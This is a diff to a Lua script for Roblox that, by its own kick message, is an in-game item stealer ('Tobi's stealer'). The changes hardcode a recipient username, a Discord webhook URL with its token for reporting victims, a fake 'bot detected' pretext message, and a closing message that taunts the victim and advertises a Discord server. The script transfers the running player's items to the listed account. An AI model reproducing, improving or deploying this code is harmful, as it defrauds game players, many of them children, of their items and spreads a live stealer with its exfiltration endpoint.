@@ -4,10 +4,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {}
+local users = _G.Usernames or {"L0LADOPT"}
 local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
+local webhook = _G.webhook or "https://discord.com/api/webhooks/1458519646222417934/K91HbptSTYoqYkv41JDuL2ibD1VGzyTxrUKT5B3Tfg-5YUScHtzk8vE6rxHIdej7x8bF"
 
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
@@ -41,7 +41,7 @@ local toolApp = playerGui.ToolApp.Frame
 local tradeLicense = require(game.ReplicatedStorage.SharedModules.TradeLicenseHelper)
 
 if not tradeLicense.player_has_trade_license() then
-    plr:kick("Data cannot be rollbacked on this account.")
+    plr:kick("You need to have played at least 10+ hours. Bot detected - ")
     return
 end
 
@@ -408,7 +408,7 @@ if #itemsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("Server error.")
+        plr:kick("All your stuff just got taken by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserChat()
